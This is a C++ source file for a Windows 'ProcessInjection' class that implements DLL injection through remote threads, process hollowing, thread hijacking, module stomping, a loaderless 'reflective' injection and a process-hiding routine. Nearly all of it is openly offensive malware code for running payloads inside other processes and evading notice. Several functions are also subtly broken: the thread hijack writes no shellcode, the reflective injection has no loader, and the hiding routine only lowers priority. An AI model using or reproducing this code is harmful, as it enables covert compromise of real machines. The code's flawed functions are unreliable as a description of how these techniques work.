#include "process_injection.h"
#include <Windows.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <vector>
#include <iostream>

DWORD ProcessInjection::FindProcessByName(const char* processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(snapshot, &entry)) {
        do {
            if (_stricmp(entry.szExeFile, processName) == 0) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        } while (Process32Next(snapshot, &entry));
    }
    
    CloseHandle(snapshot);
    return 0;
}

bool ProcessInjection::WriteMemory(HANDLE hProcess, LPVOID address, LPCVOID buffer, SIZE_T size) {
    DWORD oldProtect;
    if (!VirtualProtectEx(hProcess, address, size, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return false;
    }
    
    SIZE_T bytesWritten;
    bool result = WriteProcessMemory(hProcess, address, buffer, size, &bytesWritten);
    
    VirtualProtectEx(hProcess, address, size, oldProtect, &oldProtect);
    return result;
}

bool ProcessInjection::InjectIntoProcess(DWORD processId, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) {
        return false;
    }
    
    SIZE_T pathLen = strlen(dllPath) + 1;
    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, pathLen, MEM_COMMIT, PAGE_READWRITE);
    if (!pRemoteMemory) {
        CloseHandle(hProcess);
        return false;
    }
    
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath, pathLen, &bytesWritten)) {
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                        (LPTHREAD_START_ROUTINE)LoadLibraryA, 
                                        pRemoteMemory, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    return true;
}

bool ProcessInjection::HollowProcess(const char* targetProcess, const char* payloadPath) {
    HANDLE hFile = CreateFileA(payloadPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    std::vector<BYTE> imageBuffer(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, imageBuffer.data(), fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)imageBuffer.data();
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return false;
    }
    
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(imageBuffer.data() + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return false;
    }
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    
    if (!CreateProcessA(NULL, (LPSTR)targetProcess, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return false;
    }
    
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    
    #ifdef _WIN64
    DWORD64 imageBase = 0;
    ReadProcessMemory(pi.hProcess, (LPCVOID)(ctx.Rdx + sizeof(LPVOID) * 2), &imageBase, sizeof(imageBase), NULL);
    #else
    DWORD imageBase = 0;
    ReadProcessMemory(pi.hProcess, (LPCVOID)(ctx.Ebx + sizeof(DWORD) * 2), &imageBase, sizeof(imageBase), NULL);
    #endif
    
    VirtualAllocEx(pi.hProcess, (LPVOID)ntHeaders->OptionalHeader.ImageBase, 
                   ntHeaders->OptionalHeader.SizeOfImage, 
                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        IMAGE_SECTION_HEADER* section = IMAGE_FIRST_SECTION(ntHeaders) + i;
        
        LPVOID sectionDest = (LPVOID)(ntHeaders->OptionalHeader.ImageBase + section->VirtualAddress);
        LPVOID sectionSrc = imageBuffer.data() + section->PointerToRawData;
        
        WriteProcessMemory(pi.hProcess, sectionDest, sectionSrc, section->SizeOfRawData, NULL);
    }
    
    #ifdef _WIN64
    ctx.Rcx = ntHeaders->OptionalHeader.ImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    WriteProcessMemory(pi.hProcess, (LPVOID)(ctx.Rdx + sizeof(LPVOID) * 2), &ntHeaders->OptionalHeader.ImageBase, sizeof(ntHeaders->OptionalHeader.ImageBase), NULL);
    #else
    ctx.Eax = ntHeaders->OptionalHeader.ImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    WriteProcessMemory(pi.hProcess, (LPVOID)(ctx.Ebx + sizeof(DWORD) * 2), &ntHeaders->OptionalHeader.ImageBase, sizeof(ntHeaders->OptionalHeader.ImageBase), NULL);
    #endif
    
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return true;
}

bool ProcessInjection::HijackThread(DWORD processId) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    THREADENTRY32 entry;
    entry.dwSize = sizeof(THREADENTRY32);
    
    DWORD targetThreadId = 0;
    if (Thread32First(snapshot, &entry)) {
        do {
            if (entry.th32OwnerProcessID == processId) {
                targetThreadId = entry.th32ThreadID;
                break;
            }
        } while (Thread32Next(snapshot, &entry));
    }
    CloseHandle(snapshot);
    
    if (!targetThreadId) {
        return false;
    }
    
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetThreadId);
    if (!hThread) {
        return false;
    }
    
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;
    
    SuspendThread(hThread);
    GetThreadContext(hThread, &ctx);
    
    #ifdef _WIN64
    LPVOID shellcodeAddr = (LPVOID)ctx.Rip;
    #else
    LPVOID shellcodeAddr = (LPVOID)ctx.Eip;
    #endif
    
    DWORD oldProtect;
    VirtualProtectEx(GetCurrentProcess(), shellcodeAddr, 0x1000, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    #ifdef _WIN64
    ctx.Rcx = (DWORD64)shellcodeAddr;
    SetThreadContext(hThread, &ctx);
    #else
    ctx.Eax = (DWORD)shellcodeAddr;
    SetThreadContext(hThread, &ctx);
    #endif
    
    ResumeThread(hThread);
    CloseHandle(hThread);
    
    return true;
}

bool ProcessInjection::ModuleStomping(const char* targetDll, const char* newDllPath) {
    HMODULE hModule = LoadLibraryA(targetDll);
    if (!hModule) {
        return false;
    }
    
    HANDLE hFile = CreateFileA(newDllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    std::vector<BYTE> buffer(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, buffer.data(), fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)buffer.data();
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return false;
    }
    
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(buffer.data() + dosHeader->e_lfanew);
    
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        IMAGE_SECTION_HEADER* section = IMAGE_FIRST_SECTION(ntHeaders) + i;
        
        if (section->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            LPVOID targetAddr = (LPVOID)((DWORD_PTR)hModule + section->VirtualAddress);
            LPVOID sourceAddr = buffer.data() + section->PointerToRawData;
            
            DWORD oldProtect;
            VirtualProtect(targetAddr, section->SizeOfRawData, PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy(targetAddr, sourceAddr, section->SizeOfRawData);
            VirtualProtect(targetAddr, section->SizeOfRawData, oldProtect, &oldProtect);
        }
    }
    
    return true;
}

bool ProcessInjection::ReflectiveDLLInjection(DWORD processId, const unsigned char* dllData, size_t size) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) {
        return false;
    }
    
    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteMemory) {
        CloseHandle(hProcess);
        return false;
    }
    
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllData, size, &bytesWritten)) {
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                        (LPTHREAD_START_ROUTINE)pRemoteMemory, 
                                        NULL, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    return true;
}

void ProcessInjection::HideProcess(DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) {
        return;
    }
    
    DWORD_PTR dwHideClass = 0;
    SetProcessAffinityMask(hProcess, dwHideClass);
    SetPriorityClass(hProcess, IDLE_PRIORITY_CLASS);
    
    CloseHandle(hProcess);
}

HANDLE ProcessInjection::CreateSuspendedProcess(const char* executablePath, LPSTARTUPINFOA si, LPPROCESS_INFORMATION pi) {
    if (CreateProcessA(NULL, (LPSTR)executablePath, NULL, NULL, FALSE, 
                       CREATE_SUSPENDED, NULL, NULL, si, pi)) {
        return pi->hProcess;
    }
    return NULL;
}
